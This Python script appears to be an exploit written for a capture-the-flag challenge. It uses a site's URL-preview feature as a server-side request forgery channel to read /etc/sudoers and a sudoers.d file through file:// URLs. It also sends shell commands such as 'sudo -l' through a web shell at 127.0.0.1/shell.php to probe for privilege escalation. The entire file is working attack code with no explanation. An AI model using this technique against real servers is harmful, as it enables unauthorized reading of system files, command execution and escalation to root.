import urllib.request
import urllib.parse
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return m.group(1).strip()[:3000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER'
    except Exception as e:
        return f'EXCEPTION: {e}'

def shell(cmd):
    result = fetch(f'http://127.0.0.1/shell.php?c={urllib.parse.quote(cmd)}')
    return result

# Check sudo -l
print("=== sudo -l ===")
print(shell('sudo -l'))
print()

# Check sudoers file
print("=== cat /etc/sudoers ===")
print(fetch('file:///etc/sudoers'))
print()

# Check sudoers.d
print("=== ls -la /etc/sudoers.d/ ===")
print(shell('ls -la /etc/sudoers.d/'))
print()

print("=== cat /etc/sudoers.d/* ===")
print(fetch('file:///etc/sudoers.d/www-data'))
